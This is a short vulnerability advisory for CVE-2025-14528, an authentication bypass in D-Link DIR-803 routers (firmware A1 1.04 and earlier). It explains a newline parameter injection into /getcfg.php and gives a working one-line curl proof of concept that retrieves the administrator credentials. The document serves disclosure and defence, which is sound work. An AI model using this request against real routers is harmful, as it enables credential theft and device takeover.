------
### **CVE-2025-14528**

**Affected Product**: D-Link DIR-803 Router

**Affected Firmware Versions**:  A1 1.04 and earlier

**Vulnerability Type**: Authentication Bypass

**Organization**: School of Cybersecurity, Northwestern Polytechnical University

**Author**: 邱佳慧 毛伯敏 郭鸿志


------
### **Vulnerability Description**

An authentication bypass vulnerability exists in the /getcfg.php interface of D-Link DIR-803 routers (A1 1.04 and earlier). By supplying SERVICES=DEVICE.ACCOUNT together with an injected AUTHORIZED_GROUP=1%0a parameter, an attacker can cause getcfg.php to return the XML configuration containing administrator login credentials.


---
### **PoC**
`curl 'http://192.168.0.1:80/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1'`
![1](./img/1.png)

This allows access to sensitive information such as administrator passwords.
![1](./img/2.png)
